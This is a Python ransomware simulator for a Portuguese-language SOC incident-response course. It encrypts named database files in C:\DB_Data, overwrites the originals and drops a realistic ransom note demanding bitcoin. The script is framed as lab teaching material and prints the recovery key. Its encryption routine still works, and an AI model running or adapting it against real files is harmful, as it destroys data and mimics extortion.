#!/usr/bin/env python3
"""
Simulador de Ransomware - Aula 3.4
Curso de SOC - Resposta a Incidentes

ESTE SCRIPT EH INOFENSIVO E APENAS PARA FINS DIDATICOS.
Execute apenas dentro da VM de laboratorio isolada.
NAO execute em sistemas de producao.

Ele criptografa arquivos em C:\DB_Data\ usando uma chave local
e cria uma nota de resgate simulada.
"""

import os
import sys
from datetime import datetime
from cryptography.fernet import Fernet

TARGET_DIR = "C:\\DB_Data"

TARGET_FILES = [
    "clientes.mdf",
    "vendas.ldf",
    "produtos.mdf",
    "financeiro.ldf",
    "rh_dados.mdf"
]

RANSOM_NOTE = """==============================================
              SEUS ARQUIVOS FORAM CRIPTOGRAFADOS
==============================================

Todos os seus arquivos de banco de dados foram criptografados
com criptografia AES-256.

Para recuperar seus dados, voce precisa pagar um resgate
de 10 BTC (aproximadamente R$ 2.500.000,00) para a
carteira abaixo:

  1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

Apos o pagamento, entre em contato pelo email:
  recover@ransomgroup-xy.onion

Envie seu ID de vitima: VICTIM-2026-0619-001

PRAZO: 72 horas. Apos isso, o valor dobra.
Apos 7 dias, a chave de decriptacao sera destruida
e seus dados serao perdidos para sempre.

NAO TENTE recuperar os arquivos sozinho.
NAO CONTATE a policia.
NAO USE ferramentas de terceiros.

==============================================
                RANSOMGROUP
==============================================
"""

def simulate_ransomware():
    print("[*] Iniciando simulacao de ransomware...")
    print("")
    
    # Gerar chave de criptografia
    chave = Fernet.generate_key()
    fernet = Fernet(chave)
    print("[+] Chave de criptografia gerada")
    
    # Criptografar cada arquivo
    encrypted_count = 0
    for filename in TARGET_FILES:
        filepath = os.path.join(TARGET_DIR, filename)
        
        if not os.path.exists(filepath):
            print(f"[!] Arquivo nao encontrado: {filepath}")
            continue
        
        # Ler conteudo original
        with open(filepath, "rb") as f:
            original = f.read()
        
        # Criptografar
        encrypted = fernet.encrypt(original)
        
        # Sobrescrever arquivo com versao criptografada
        with open(filepath, "wb") as f:
            f.write(encrypted)
        
        encrypted_count += 1
        print(f"[+] Arquivo criptografado: {filename}")
    
    # Criar nota de resgate
    ransom_path = os.path.join(TARGET_DIR, "README_DECRYPT.txt")
    with open(ransom_path, "w") as f:
        f.write(RANSOM_NOTE)
    
    print(f"[+] Nota de resgate criada: README_DECRYPT.txt")
    
    print("")
    print("==============================================")
    print("              AVISO DE RANSOMWARE             ")
    print("==============================================")
    print("Seus arquivos foram criptografados.")
    print("")
    print(f"Total de arquivos afetados: {encrypted_count}")
    print(f"Diretorio: {TARGET_DIR}")
    print(f"Nota de resgate: {ransom_path}")
    print("")
    print("Para recuperar os dados, execute o script de")
    print("recuperacao com a chave correta.")
    print("==============================================")
    print("")
    print(f"[*] Chave de recuperacao (guarde para a Aula 4):")
    print(f"    {chave.decode()}")
    print("")
    print("[*] Simulacao concluida. O atacante permanece conectado.")

if __name__ == "__main__":
    # Verificar se esta no Windows
    if os.name != "nt":
        print("[!] Este script foi feito para Windows (C:\\DB_Data\\)")
        print("[!] No Linux, ajuste o caminho para /data/db/")
        sys.exit(1)
    
    # Verificar se o diretorio existe
    if not os.path.exists(TARGET_DIR):
        print(f"[!] Diretorio {TARGET_DIR} nao encontrado.")
        print("[!] Execute o script de preparacao do ambiente primeiro (prep2_setup_windows.ps1).")
        sys.exit(1)
    
    simulate_ransomware()